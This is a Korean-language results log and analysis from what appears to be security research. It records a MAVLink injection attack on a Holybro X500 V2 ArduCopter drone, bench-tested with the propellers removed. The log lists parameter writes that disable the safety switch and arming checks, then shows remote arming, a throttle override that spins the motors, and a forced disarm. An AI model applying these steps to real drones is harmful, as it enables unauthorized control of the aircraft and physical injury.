# 📊 공격 실행 결과 로그

> 실제 공격 코드(`mavlink_key_injection.py`)를 Holybro X500 V2 드론에 실행한 결과입니다.

---

## 실행 환경

| 항목 | 설정 |
|------|------|
| **스크립트** | `test.py` (mavlink_key_injection.py 기반) |
| **연결** | COM4 (시리얼 UART, 57600 baud) |
| **드론** | Holybro X500 V2, ArduCopter V4.5.7 |
| **테스트 조건** | 벤치 테스트, 프로펠러 제거 상태 |

---

## 전체 실행 로그

```
PS C:\Users\user\Desktop\problem\al\mavlink> python test.py

[CONNECT] COM4
[FIX] Safety off + MAIN1-4 motor mapping + checks relax

# ── 파라미터 설정 단계 ──
[PARAM] BRD_SAFETYENABLE write (no immediate readback)
[PARAM] BRD_SAFETY_DEFLT -> 0.0
[PARAM] BRD_SAFETY_MASK -> 0.0
[PARAM] BRD_SAFETYOPTION -> 0.0
[PARAM] FRAME_CLASS -> 1.0
[PARAM] FRAME_TYPE -> 1.0
[PARAM] MOT_PWM_TYPE -> 0.0
[PARAM] BRD_PWM_COUNT write (no immediate readback)
[PARAM] SERVO1_FUNCTION -> 33.0
[PARAM] SERVO2_FUNCTION -> 34.0
[PARAM] SERVO3_FUNCTION -> 35.0
[PARAM] SERVO4_FUNCTION -> 36.0
[PARAM] ARMING_CHECK -> 0.0
[PARAM] DISARM_DELAY -> 60.0
[PARAM] MOT_SPIN_ARM -> 0.10000000149011612

# ── FCU 재부팅 ──
[REBOOT] FCU reboot…
[FCU] RCInput: decoding SBUS(1)

# ── 진단 출력 ──
[DIAG] {
  'BRD_SAFETYENABLE': None,
  'BRD_SAFETY_DEFLT': 0.0,
  'BRD_SAFETY_MASK': 0.0,
  'BRD_SAFETYOPTION': 0.0,
  'DISARM_DELAY': None,
  'MOT_SPIN_ARM': 0.10000000149011612,
  'MOT_PWM_TYPE': 0.0,
  'BRD_PWM_COUNT': None,
  'SERVO1_FUNCTION': 33.0,
  'SERVO2_FUNCTION': None,
  'SERVO3_FUNCTION': 35.0,
  'SERVO4_FUNCTION': 36.0
}

# ── ARM (시동) ──
[ACK ARM] COMMAND_ACK {
  command : 400, result : 0, progress : 0,
  result_param2 : 0, target_system : 255,
  target_component : 190
}

# ── 모터 회전 (10초간) ──
[SPIN] throttle=1550us for 10.0s
[RCOU] ch1~4 = [1000, 1000, 1000, 1000]    ← 초기 상태
  ...
[RCOU] ch1~4 = [1608, 1625, 1693, 1532]    ← 모터 회전 중

# ── 쿨다운 (2초간) ──
[COOLDOWN] back to 1000us for 2.0s
[RCOU] ch1~4 = [1607, 1626, 1701, 1522]    ← 감속 시작
  ...
[RCOU] ch1~4 = [1100, 1100, 1100, 1100]    ← 거의 정지

# ── DISARM (정지) ──
[DISARM]
[ACK ARM] COMMAND_ACK {
  command : 400, result : 0, progress : 0,
  result_param2 : 0, target_system : 255,
  target_component : 190
}
✅ Done.
```

---

## 로그 분석

### 1. 파라미터 설정 단계

공격 코드가 드론의 파라미터를 원격으로 조작하는 과정입니다.

| 동작 | 설명 |
|------|------|
| `BRD_SAFETYENABLE → 0` | 세이프티 스위치 비활성화. 물리적 안전장치 해제 |
| `ARMING_CHECK → 0` | Pre-Arm 체크 우회. GPS/센서 없이 ARM 가능 |
| `SERVO1~4_FUNCTION → 33~36` | MAIN 출력 1~4를 모터 1~4에 매핑 |
| `DISARM_DELAY → 60` | 자동 DISARM 지연을 60초로 설정 |

### 2. 재부팅 및 진단

- `[REBOOT] FCU reboot…` → 파라미터 적용을 위해 FCU를 원격 재부팅
- `[FCU] RCInput: decoding SBUS(1)` → 재부팅 후 수신기 연결 정상 확인
- `[DIAG]` → 파라미터 readback 결과. 일부 값이 `None`인 이유:
  - `BRD_SAFETYENABLE`, `DISARM_DELAY`, `BRD_PWM_COUNT` 등은 **즉시 readback 불가** (쓰기 전용 파라미터)
  - 재부팅 후에는 정상 적용됨

### 3. ARM 성공

```
[ACK ARM] COMMAND_ACK { command: 400, result: 0 }
```
- `command: 400` = `MAV_CMD_COMPONENT_ARM_DISARM`
- `result: 0` = `MAV_RESULT_ACCEPTED` (**성공**)
- 공격자의 서명된 ARM 명령이 정상적으로 수행됨

### 4. 모터 회전 제어

- 스로틀 오버라이드: CH3 = **1550μs** (중간 출력)
- 각 모터 출력값 (SERVO_OUTPUT_RAW):
  - 초기: `[1000, 1000, 1000, 1000]` → 모터 정지
  - 최대: `[1608, 1625, 1693, 1532]` → 모터 회전 중
  - 쿨다운: `[1100, 1100, 1100, 1100]` → 거의 정지

> 4개 모터의 출력값이 다른 이유: ArduCopter의 **자세 제어 PID**가 각 모터를 개별 조정하기 때문

### 5. 강제 DISARM

```
[ACK ARM] COMMAND_ACK { command: 400, result: 0 }
```
- 매직 넘버 **21196**을 사용한 강제 DISARM 성공
- 모든 Pre-Arm/Pre-Disarm 체크를 우회하여 즉시 모터 정지

---

## 파라미터 검증 테이블

공격 코드에서 설정한 값과 실제 드론에 적용된 값의 비교:

| Param | Code Value | Param Value | Status |
|-------|-----------|-------------|--------|
| `FRAME_CLASS` | 1 | 1.0 | ✔ 일치 |
| `FRAME_TYPE` | 1 | 1.0 | ✔ 일치 |
| `BRD_PWM_COUNT` | 4 | — | — (파일에 없음) |
| `MOT_PWM_TYPE` | 0 | 0.0 | ✔ 일치 |
| `SERVO1_FUNCTION` | 33 | 33.0 | ✔ 일치 |
| `SERVO2_FUNCTION` | 34 | 34.0 | ✔ 일치 |
| `SERVO3_FUNCTION` | 35 | 35.0 | ✔ 일치 |
| `SERVO4_FUNCTION` | 36 | 36.0 | ✔ 일치 |
| `BRD_SAFETYENABLE` | 0 | — | — (파일에 없음) |
| `BRD_SAFETY_DEFLT` | 0 | 0.0 | ✔ 일치 |
| `BRD_SAFETY_MASK` | 0 | 0.0 | ✔ 일치 |
| `BRD_SAFETYOPTION` | 0 | 0.0 | ✔ 일치 |
| `ARMING_CHECK` | 0 | 0.0 | ✔ 일치 |
| `DISARM_DELAY` | 60 | 60.0 | ✔ 일치 |
| `MOT_SPIN_ARM` | 0.1 | 0.1 | ✔ 일치 |
| `RC_MAP_THROTTLE` | 3 | 3 | ✔ 일치 |

> `Code Value`: 공격 코드에서 설정 요청한 값  
> `Param Value`: `param.param` 파일에서 확인된 기존 값  
> 대부분 일치하며, 파일에 없는 항목은 기본값이 사용됨
